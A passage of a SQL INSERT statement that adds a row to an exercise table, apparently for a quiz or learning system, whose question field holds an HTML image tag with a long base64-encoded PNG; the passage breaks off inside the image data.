INSERT INTO `tb_exercises` (`id`, `exercise_title`, `exercise_program`, `parent_id`, `choice_a`, `choice_b`, `choice_c`, `choice_d`, `correct_answer`, `analysis`, `exercise_type`, `ques_type`, `is_delete`, `create_by`, `create_time`, `update_by`, `update_time`, `remark`) VALUES (2, NULL, '<p><img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAXUAAAFlCAYAAAAUK3hTAAABUmlDQ1BJQ0MgUHJvZmlsZQAAGJV10DFLAmEYB/D/kaFoRENDgeENLoFFnEJDkzqEUHBYobWd53lG5/VydxLtQXtDNDY1SEuTRItDHyAIKvoA+gGEW1Ku5/Wq06IXHp4ffx5eHh5AGCiMGSEADdOxips5sbx/IIZ7iCKBCBYRV1SbZWV5i0bw3Sef+wKB9+cV/lehnxDCCyVhafuu+dZq3f+dn3jRqmar1AdUSZVZDiCIZPnEYdyMPG/RUuQzbt33FXfF9+1oZreYJ3fIc2pdqZKfyKnKWK6PuWE01a8d+PYzmrm3Qz1CFYeEDMqQ/pnJjGbyOAbDKSwcQkcdDkRkKWEwoJELMKFiFSmyhDWqNL/t75sF2dE1sH5O6AZZrQs8XACzG0GWlGmVHvAYY4ql/FxScEN2LS35jrWB6UvP65eA8DIwfPW8j7bnDW+AqXeg434CzANhFHOUvbUAAAA4ZVhJZk1NACoAAAAIAAGHaQAEAAAAAQAAABoAAAAAAAKgAgAEAAAAAQAAAXWgAwAEAAAAAQAAAWUAAAAAherisQAAQABJREFUeAHtnQf8HkXx/9cuiCWEXiQQQu+9SkkIHf8SkCIt1NBBaqSFEooiQgAhwI8iEGoiQSFU6b0EpJdQA4TeREHU+897ZM997rm7555evjOv1z23tzvbPvfc3N7s7szXIiFnZAgYAoaAIdATCHy9J3phnTAEDAFDwBBQBEyo2x/BEDAEDIEeQsCEeg/dTOuKIWAIGAIm1O0/YAgYAoZADyFgQr2HbqZ1xRAwBAwBE+r2HzAEDAFDoIcQMKHeQzfTumIIGAKGQMcL9UMPPdRdcsklTblTV199tdt1113jo1GVUGZfoM8++0yxS+vreuut51566aW0JIszBAyBJiLwtUqbj0aOHOlOPPFE14w9Sl/72tfc3//+dzfddNM5wml1EA+lpdWLy8SJE90dd9zh/vWvf7nTTz+9YXVk9aXe9rYi/4orruhOOukkt+aaa1as7oMPPnD9+/dPxQ0M+vXr5+AxMgQMgdYhkCnUt9lmG3fppZe6b33rW+7LL79MfXDrbWYo/MJwWO5HH33kvvOd76jgD+MbGf7HP/7hpp9++ob1MasvjWwzLznqaTRR5m233Va3UH/nnXfcTDPN5L7+9Y7/GGw0hFaeIdBWBDKfOAT6M8884/75z382pYGVRt7bbrut49h7771TP/GvueYad84552jblllmGTfjjDO6N954I7Wtd955p9txxx3duHHjUtOzIhnFH3TQQSXJXI8aNaokjov111/fffvb33ZbbLFFWRoRRx11lKbDVy/9+Mc/zhSWfPmMGDHCHX/88WXVgPk666yjL+rFFlvMXX755TEP/fJ9PfvsszUcxnlGylhhhRW0L2lqJn/fDjjgAP3C8/nC84svvujmnHNON9tss7nXX389TNIwL4JZZpmlLN4iDAFDoAAC8pBWJCmmIk81DAsssEAkggmbM9E888yjhw/vtddeWpSP/8Y3vqF8yfJ32WWXaPnll9e0jTfeOFp88cU1LHremFU+/TVORvpan6gDIl9+zCQBEYSpdYwePbosnnaKyiHO/uabbyrPwgsvHIkwjURQleT5z3/+E9GHH/7wh1r3zDPPrOmff/55XEbRgC9rhhlmiAgnibZxzD333NGss84a0W9P7777rqaBPRistNJKkbwMfXI011xz6UF+2uivOXuaPHmylgHu9NX3xadz9veNcn7yk5+ESRpeZJFFtIxhw4ZFonePy0sy0nb5eor+/e9/J5Ps2hAwBHIQKCSteUAbTZ988kkkunQt9m9/+1uJAArrQkik1Y9QJ55yPHF92WWX+UsVpgj8SlSPUKfOI444oqSKsL28GELhCuOCCy4YrbrqqiV5Kl28/PLL2t/VVlstlXXgwIGpOHnmOeaYI/rud7/rLzPPtF3UL6nppP3pT3+K095///3MOuFNCvVXX31V+eXrLy7j2WefzSxDvmo0TdR/Mb8FDAFDIB+BTPWLPJRNpQ8//FAn2aiECUt099USE3Hf//73S7K99tprei0Cx8koz/3xj38sSW/GxTHHHJNZ7GGHHeaGDh1akn7KKae4e+65pyQu7wK10bzzzutuv/12d9ddd6WyTpkyxf31r39NTSPywQcfdPJ14GQE76ZNm5bJVylho402qsSSmT527FidBwjvtbzglP/cc88ty3f99dc78IOfvhsZAoZAZQS+WZml8RzhBF8yLO+gkgrD9DCB+Kw0+D7++GNlF9VHmK0h4bx60yqQ0W1uW9PyhHH+pYCe+uGHHw6TSsKigiq5Di/QYbPKh9Uqs88+uybddNNNqmMP+aoJV8Ih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